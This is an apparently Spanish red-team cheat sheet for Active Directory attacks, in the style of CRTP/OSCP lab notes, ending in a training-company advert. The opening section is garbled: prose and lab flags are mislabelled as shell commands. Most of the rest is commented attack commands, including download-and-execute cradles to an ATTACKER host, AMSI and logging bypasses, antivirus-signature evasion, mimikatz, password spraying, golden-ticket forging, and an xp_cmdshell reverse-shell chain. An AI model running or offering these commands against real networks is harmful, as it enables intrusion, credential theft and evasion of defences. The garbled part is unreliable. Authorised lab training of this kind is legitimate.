Como forma de presentar PowerView, repasemos partes de nuestro pasos de enumeración de la sección anterior. PowerView ya lo es instalado en el C:\Herramientas carpeta en CLIENTE75. Para usarlo, Primero lo importaremos a la memoria:
```

#### Command execution
```bash
Abramos una segunda ventana de PowerShell y enumeremos el contenido del SMB compartir en WEB04 con ruta UNC \\web04.corp.com\backup. Esto lo hará crear y almacenar en caché un ticket de servicio.
```

#### Command execution
```bash
Algunos de los laboratorios requieren que lo hagas iniciar la(s) máquina(s) de destino abajo.
```

#### Command execution
```bash
R: sekurlsa::logonpasswords
```

#### Command execution
```bash
Esta táctica de rociado de contraseñas ya está implementada en el script de PowerShell C:\Tools\Spray-Passwords.ps1 en CLIENT75.
```

#### Command execution
```bash
R: CLIENT76
```

#### Command execution
```bash
R: 18200
```

#### Command execution
```bash
R:Summerland1
```

#### Command execution
```bash
nxc smb ips.txt -u pete -p 'Nexus123!'
```

#### Command execution
```bash
Información
```

#### Command execution
```bash
Ahora que tenemos nuestro objeto PSCredential, necesitamos para crear un modelo de información común (CIM) a través del cmdlet New-CimSession.
```

#### Command execution
```bash
Como paso final, necesitamos unir todos los argumentos que configurado previamente mediante la emisión del cmdlet Invoke-CimMethod y proporcionando Win32_Process a ClassName y Create a MethodName. Para enviar el argumento, los envolvemos en @{CommandLine =$Command}.
```

#### Command execution
```bash
R: New-CimSession
```

#### Command execution
```bash
R: OS{e4215b1ed4baf8f04f0a2a92e407078b}
```

#### Command execution
```bash
Escribe psexesvc.exe en el directorio C:\Windows
```

#### Command execution
```bash
Ejecuta el programa/comando solicitado como un proceso secundario de psexesvc.exe
```

#### Command execution
```bash
R: ADMIN$
```

#### Command execution
```bash
R: OS{918290f05acfd51ebf09834af48231d9}
```

#### Command execution
```bash
Impacket
```

#### Command execution
```bash
R:  445
```

#### Command execution
```bash
R: OS{c0743a9737828ef16787e8d0245994bd}
```

#### Command execution
```bash
R:klist
```

#### Command execution
```bash
R:OS{dd1db5a8179b84de80ac0f5ce4fc22b4}
```

#### Command execution
```bash
Primero iniciemos sesión como jen para CLIENT76 y verifiquemos que no podemos acceder al recurso en WEB04. Para ello, haremos lo siguiente: Intente enumerar el contenido de la carpeta \\web04\backup desde un archivo sesión administrativa de la línea de comandos de PowerShell.
```

#### Command execution
```bash
R: OS{c0f41dfbf56d272932ba8ddc94163975}
```

#### Command execution
```bash
R: ExecuteShellCommand
```

#### Command execution
```bash
R: OS{27699b7c390f84e696696ca2db30d333}
```

#### Command execution
```bash
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
```

#### Command execution
```bash
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local Administrator
```

#### Configuración por defecto
```bash
Include /etc/ssh/sshd_config.d/*.conf
```

#### Configuración por defecto
```bash
Subsystem sftp /usr/lib/openssh/sftp-server
```

#### Detección en red
```bash
873/tcp open rsync (protocol version 31)
```

#### Listar recursos
```bash
rsync -av --list-only rsync://127.0.0.1/dev
```

#### Descargar archivos expuestos
```bash
rsync -av rsync://127.0.0.1/dev .
```

#### Convierte un ticket Kerberos de formato kirbi (Windows) a ccache (Linux) y lo carga en la variable de entorno para usar con herramientas Linux.
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache && export KRB5CCNAME=ticket.ccache
```

#### Identifica version y edition. CRTP usa Windows PowerShell; PowerShell Core existe, pero muchas tecnicas AD clasicas dependen de Windows PowerShell y .NET.
```bash
$PSVersionTable
```

#### Muestra el host de PowerShell actual. Recuerda: PowerShell no es solo powershell.exe; el motor real esta en System.Management.Automation.dll.
```bash
Get-Host
```

#### Comprueba si el proceso actual ha cargado System.Management.Automation.dll. Esto explica por que PowerShell puede vivir dentro de otros procesos/hosts.
```bash
[System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.Location -match 'System.Management.Automation'} | Select-Object Location
```

#### Lista modulos instalados. Antes de importar herramientas externas, revisa si ya hay ADModule/RSAT disponible.
```bash
Get-Module -ListAvailable
```

#### Lista comandos exportados por un modulo. Buen habito CRTP: carga modulo -> enumera comandos -> entiende verbos y sustantivos.
```bash
Get-Command -Module ActiveDirectory
```

#### Execution Policy no es una barrera de seguridad fuerte; evita ejecuciones accidentales. Aun asi, documenta el estado antes de cambiar nada.
```bash
Get-ExecutionPolicy -List
```

#### Bypass por proceso para laboratorio/autorizado. No cambia necesariamente la politica global; util para entender por que Execution Policy no debe tratarse como control de seguridad.
```bash
powershell -ExecutionPolicy Bypass -File .\script.ps1
```

#### Ejecuta un comando corto desde un nuevo proceso PowerShell. Sirve para comparar politica/entorno entre procesos.
```bash
powershell -c "Get-ExecutionPolicy"
```

#### Download-execute cradle clasico. Concepto: descargar script en memoria y ejecutarlo. En entornos reales es ruidoso y muy detectado; en CRTP sirve para entender tradecraft historico.
```bash
iex (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
```

#### PowerShell v3+: Invoke-WebRequest como cradle compacto. Piensa en esto como artefacto de laboratorio y telemetria, no como tecnica limpia.
```bash
iex (iwr 'http://ATTACKER/payload.ps1')
```

#### Cradle via COM XMLHTTP. Muestra que no todo pasa por WebClient/IWR; defensivamente conviene mirar proceso, red y script block.
```bash
$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://ATTACKER/payload.ps1',$false); $h.send(); iex $h.responseText
```

#### Cradle via WebRequest/StreamReader. Misma idea: traer texto y ejecutarlo. En RedDrill queda para reconocer patrones y laboratorios autorizados.
```bash
$wr=[System.Net.WebRequest]::Create('http://ATTACKER/payload.ps1'); $r=$wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

#### Comprueba si hay transcription configurada por politica. Transcription puede guardar entrada/salida de sesiones PowerShell.
```bash
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
```

#### Comprueba Script Block Logging. Este control registra bloques de codigo PowerShell, incluso cuando se ejecutan en memoria.
```bash
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

#### AppLocker puede forzar restricciones y relacionarse con CLM. Sirve para entender controles antes de intentar cargar herramientas.
```bash
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

#### Invisi-Shell con privilegios admin en laboratorio CRTP. Usa CLR Profiler API para alterar logging de PowerShell. Ejecutalo solo en entorno autorizado.
```bash
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
```

#### Invisi-Shell sin privilegios admin en laboratorio. Al salir con exit, el script realiza limpieza de la sesion preparada.
```bash
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

#### DefenderCheck ayuda a identificar cadenas o bloques que Defender podria marcar. Usalo para entender firmas en lab, no para desplegar evasiones fuera de autorizacion.
```bash
DefenderCheck.exe C:\AD\Tools\PowerView.ps1
```

#### Consulta configuracion de Microsoft Defender. Sirve para entender el entorno defensivo antes de atribuir errores a PowerShell.
```bash
Get-MpPreference
```

#### Escanea el script en el laboratorio para localizar si Defender marca una zona concreta. La idea no es 'apagar el AV', sino entender si el problema es una cadena, un bloque no usado o una funcion completa.
```bash
DefenderCheck.exe C:\AD\Tools\PowerUp.ps1
```

#### Convierte un offset de deteccion a numero de linea. Flujo CRTP: DefenderCheck da offset -> ByteToLineNumber lo traduce -> revisas la funcion afectada en el editor.
```bash
C:\AD\Tools\ByteToLineNumber.ps1 C:\AD\Tools\PowerUp.ps1 0x1DCD2
```

#### Ejemplo de revision dirigida: ubica una funcion concreta relacionada con la deteccion. Antes de borrar nada, entiende si esa funcion se usa en tu objetivo.
```bash
Select-String -Path C:\AD\Tools\PowerUp.ps1 -Pattern 'function Write-ServiceBinary' -Context 0,40
```

#### Trabaja siempre sobre copia. En CRTP es comun crear una version minima del script con solo las funciones necesarias para el ejercicio.
```bash
Copy-Item C:\AD\Tools\PowerUp.ps1 C:\AD\Tools\PowerUp.min.ps1
```

#### Verifica despues de reducir el script. Si ya no hay deteccion, documenta exactamente que se quito y por que no era necesario para tu tecnica.
```bash
DefenderCheck.exe C:\AD\Tools\PowerUp.min.ps1
```

#### Abre la copia reducida para editar. En el ejemplo de CRTP, la deteccion cae dentro de una base64 embebida usada por Write-ServiceBinary.
```bash
notepad C:\AD\Tools\PowerUp.min.ps1
```

#### Busca indicadores de la parte detectada. Esto te ayuda a decidir si basta con quitar la base64 embebida o si debes quitar la funcion completa.
```bash
Select-String -Path C:\AD\Tools\PowerUp.min.ps1 -Pattern 'EncodedServiceBinary|Write-ServiceBinary|ServiceBinary' -Context 5,20
```

#### Tras cargar el script, revisa funciones relacionadas. Si tu ruta no necesita Write-ServiceBinary, reducir esa parte puede ser suficiente en el lab.
```bash
Get-Command -CommandType Function | Where-Object Name -like '*Service*'
```

#### Uso tipico de PowerUp para enumerar posibles escaladas locales. Importante: si recortaste funciones, entiende que algunos checks o abusos pueden dejar de estar disponibles.
```bash
Invoke-AllChecks
```

#### Localiza soluciones .NET del laboratorio. En .NET, los retos son deteccion por AV/EDR, entrega del binario y logging de proceso/linea de comandos.
```bash
Get-ChildItem C:\AD\Tools\Rubeus-master -Recurse -Filter *.sln
```

#### Identifica si un binario compilado dispara firmas. Igual que con PowerShell: primero medir, luego decidir si basta con modificar strings/codigo o reducir funcionalidad.
```bash
DefenderCheck.exe C:\AD\Tools\Rubeus.exe
```

#### Guarda hash antes y despues de compilar/ofuscar. Te ayuda a documentar cambios y no perder trazabilidad en el lab.
```bash
Get-FileHash C:\AD\Tools\Rubeus.exe
```

#### Revisa carpeta de salida tras compilar. Muchas herramientas de ofuscacion trabajan sobre el proyecto fuente o sobre el binario compilado.
```bash
Get-ChildItem C:\AD\Tools\Rubeus-master\Rubeus\bin\Release
```

#### Valida resolucion DNS de DCs del lab. Si DNS falla, muchas herramientas AD fallaran aunque tus credenciales sean correctas.
```bash
Resolve-DnsName dcorp-dc.dollarcorp.moneycorp.local; Resolve-DnsName mcorp-dc.moneycorp.local; Resolve-DnsName eu-dc.eurocorp.local
```

#### PowerView: extrae directamente SystemAccess. Te ayuda a decidir sprays y ritmo de pruebas autorizadas.
```bash
(Get-DomainPolicyData).systemaccess
```

#### PowerView: filtra por sistema operativo. En el lab hay Server 2022 fully patched, util para entender superficie moderna.
```bash
Get-DomainComputer -OperatingSystem '*Server 2022*'
```

#### PowerView: lista equipos que responden a ping. Ojo: ping no siempre refleja si el host esta utilizable.
```bash
Get-DomainComputer -Ping
```

#### Abre el reporte HTML generado. Revisa shares escribibles, archivos sensibles y ShareGraph.
```bash
Start-Process C:\AD\Tools\PowerHuntShares-Report.html
```

#### ShareGraph ayuda a explorar relaciones de shares en la maquina donde se abre. Util para pasar de lista a mapa.
```bash
Start-Process C:\AD\Tools\ShareGraph.html
```

#### Usando PowerView
```bash
cd \AD\Tools
```

#### Usando PowerView - Enumerate Computers. Enumeracion PowerView de equipos o atributos de equipos.
```bash
Get-DomainComputer | select -ExpandProperty dnshostname
```

#### Usando Active Directory module (ADModule)
```bash
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```

#### File share donde `studentx` tiene permisos de escritura
```bash
cat C:\AD\Tools\servers.txt
```

#### File share donde `studentx` tiene permisos de escritura
```bash
Import-Module C:\AD\Tools\PowerhuntShares.psm1
```

#### PrivescCheck: alternativa PowerShell para cobertura amplia de escalada local.
```bash
Invoke-PrivescCheck
```

#### PEASS-ng/winPEAS: enumeracion amplia local. Puede ser ruidoso; guarda salida y prioriza hallazgos explotables.
```bash
winPEASx64.exe
```

#### PowerUp: busca servicios con unquoted paths y espacios. Puede permitir escalada si hay permisos de escritura en ruta intermedia.
```bash
Get-ServiceUnquoted -Verbose
```

#### Valida alcance a Jenkins del lab en dcorp-ci:8080. Feature abuse empieza por confirmar servicio y contexto.
```bash
Test-NetConnection dcorp-ci -Port 8080
```

#### Abre Jenkins en el navegador del lab. Revisa version, permisos y si tienes acceso admin o a configuracion de jobs.
```bash
Start-Process http://dcorp-ci:8080/
```

#### Si no tienes admin global pero puedes editar build steps, el job puede ejecutar comandos como la cuenta del servicio Jenkins. Valida permisos y alcance antes.
```bash
Jenkins job -> Configure -> Build Steps -> Execute Windows Batch Command -> powershell -c <command>
```

#### Local Privilege Escalation - PowerUp
```bash
. C:\AD\Tools\PowerUp.ps1
```

#### Local Privilege Escalation - winPEAS
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

#### Local Privilege Escalation - PrivEscCheck
```bash
. C:\AD\Tools\PrivEscCheck.ps1
```

#### Hunt for Local Admin access
```bash
winrs -r:dcorp-adminsrv cmd
```

#### Comprueba si el endpoint WSMan responde.
```bash
Test-WSMan server1
```

#### Enumeracion usando PowerView desde `dcorp-ci` - Reverse shell on dcorp-ci as ciadmin by abusing Jenkins
```bash
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.81/sbloggingbypass.txt')
```

#### Enumeracion usando PowerView desde `dcorp-ci` - Reverse shell on dcorp-ci as ciadmin by abusing Jenkins
```bash
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.81/Amsi-Byp.txt')
```

#### Permite logon remoto del DSRM admin. Sin esto, el hash no se usa igual por red.
```bash
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

#### Ubicacion tipica donde se registrarian credenciales si el SSP esta activo.
```bash
C:\Windows\System32\mimilsa.log
```

#### Enumerar SQL Servers y database links
```bash
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1
```

#### Enumerar SQL Servers y database links
```bash
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Enumerar SQL Servers y database links. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

#### Ejecutar comandos mediante linked database. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"
```

#### Ejecutar comandos mediante linked database - Start a listener
```bash
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

#### Ejecutar comandos mediante linked database - Get a reverse shell. Enumera o abusa linked servers MSSQL con PowerUpSQL.
```bash
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell -c \"iex (iwr -UseBasicParsing http://172.16.100.2/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.2/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.2/Invoke-PowerShellTcpEx.ps1)\"'"
```

#### Ejecutar comandos mediante linked database - On the listener
```bash
whoami
```

#### Ejecutar comandos mediante linked database - On the listener
```bash
hostname
```

---

## 🎓 Advanced Hands-On Active Directory Training

Looking to practice complex Kerberos abuse, multi-forest trust exploitation, and EDR evasion in dedicated cloud cyber-ranges?

* 🛡️ **Interactive Labs & Courses:** [academy.araizcorp.tech](https://academy.araizcorp.tech)
* 💼 **Enterprise Red Team & Consulting:** [araizcorp.tech](https://araizcorp.tech)
* ✉️ **Inquiries:** info@araizcorp.tech

<p align="center"><sub>© 2026 AraizCorp LLC. All rights reserved. Offensive Security & Red Team Research.</sub></p>
